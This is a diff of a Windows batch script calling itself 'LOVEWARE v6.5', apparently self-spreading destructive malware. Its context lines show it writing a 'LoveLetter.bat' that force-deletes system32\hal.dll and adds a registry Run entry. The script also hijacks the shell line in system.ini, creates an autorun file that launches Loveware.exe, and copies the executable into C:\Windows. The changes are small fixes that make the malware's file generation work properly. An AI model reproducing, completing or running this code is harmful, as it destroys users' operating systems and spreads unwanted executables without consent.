@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v6.4
+:: LOVEWARE v6.5
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -124,7 +124,7 @@ MOVE /e /y Loveware.exe C:\Windows
 :: Make new file called LoveLetter.bat. It contains code that
 :: will ruin the computer.
 
-echo @echo off>>LoveLetter.bat
+echo @echo off>LoveLetter.bat
 echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>LoveLetter.bat
 echo @((( Echo Off > Nul ) & Break Off )>>LoveLetter.bat
 echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>LoveLetter.bat
@@ -233,7 +233,7 @@ echo shell=explorer.exe %b%.exe >> %windir%\system.ini
 
 :: Create autorun file
 
-echo [autorun]>>windows.inf
+echo [autorun]>windows.inf
 echo ;open=Loveware.exe>>windows.inf
 echo ShellExecute=Loveware.exe>>windows.inf
 echo UseAutoPlay=1>>windows.inf
@@ -288,6 +288,7 @@ goto haha
 
 :: Make the final payload "LoveChoice"
 
+echo @echo off>LoveChoice.bat
 echo color 57>>LoveChoice.bat
 echo title LoveChoice>>LoveChoice.bat
 
